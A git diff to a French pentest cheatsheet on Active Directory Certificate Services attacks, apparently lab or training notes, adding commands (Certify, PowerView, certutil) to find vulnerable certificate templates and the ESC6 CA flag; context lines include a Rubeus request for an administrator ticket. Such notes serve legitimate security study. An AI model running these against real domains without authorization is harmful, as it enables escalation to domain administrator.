@@ -13,6 +13,26 @@
 C:\AD\Tools\Certify.exe cas
 C:\AD\Tools\Certify.exe find
 C:\AD\Tools\Certify.exe find /vulnerable
+# Filtrer la sortie sur un template précis (flag F36)
+C:\AD\Tools\Certify.exe find | Select-String -Pattern "<TEMPLATE_NAME>" -Context 0,25
+```
+
+### Lire les Enrollment Rights d'un template en LDAP direct (alternative à Certify)
+
+```powershell
+# Utile si Certify indisponible / bloqué (flag F36)
+Get-DomainObjectAcl -SearchBase "CN=<TEMPLATE_NAME>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs |
+  ? {$_.ObjectAceType -match "Enroll"}
+```
+
+### ESC6 — flag CA `EDITF_ATTRIBUTESUBJECTALTNAME2` (F35)
+
+> Contrairement à ESC1 (flag *template* `ENROLLEE_SUPPLIES_SUBJECT`), ESC6 est un flag posé au **niveau de la CA elle-même** — n'importe quel template client-auth devient exploitable.
+
+```powershell
+# Vérification native certutil (bit 0x00040000 dans EditFlags = EDITF_ATTRIBUTESUBJECTALTNAME2)
+certutil -config "<CA_HOST>\<CA_NAME>" -getreg "policy\EditFlags"
+# Certify signale aussi la CA vulnérable dans `cas` (ligne "User Specified SAN")
 ```
 
 ### ESC1 — enrollee supplies subject (SAN arbitraire)
@@ -52,4 +72,3 @@ Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:<PW> /p
 - [[Synthèse - AD CS]]
 - [[Cheatsheet - Trusts et forêts]]
 - [[Cheatsheet - Tickets Kerberos]]
-- [[Attaques AD - MOC]]
